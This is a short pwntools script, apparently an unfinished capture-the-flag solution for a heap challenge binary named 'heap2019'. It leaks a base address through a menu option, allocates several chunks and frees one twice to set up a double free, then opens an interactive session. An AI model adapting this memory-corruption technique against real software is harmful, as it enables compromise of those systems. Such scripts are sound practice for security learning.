from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["",]
libc=ELF('./libc-2.23.so')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./heap2019_patched")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

def add(length, content):
    ru(b'2019:\n')
    sl(b'1')
    ru(b'length:\n')
    sl(str(length))
    ru(b'Content:\n')
    s(content)

def edit(comment):
    ru(b'2019:\n')
    sl(b'2')
    ru(b'Comment:\n')
    s(comment)

def delete(id):
    ru(b'2019:\n')
    sl(b'3')
    ru(b'id:\n')
    sl(str(id))

def show():
    ru(b'2019:\n')
    sl(b'2019')
    ru(b'0x')
    s = int(rl()[:-1],16)
    return s

gdb.attach(p,'''
    b *$rebase(0xba7)
    b *$rebase(0xa6a)
    b *$rebase(0xc5a)
''')

leak_addr = show() - 0x202040 
pr('leak_addr', leak_addr)

add(0x91, b'a' * 0x90) 
add(0x91, b'a' * 0x90)
add(0x91, b'a' * 0x90) 
add(0x91, b'a' * 0x90) 
add(0x91, b'a' * 0x90) 
delete(0)
delete(1)
delete(0)


shell()
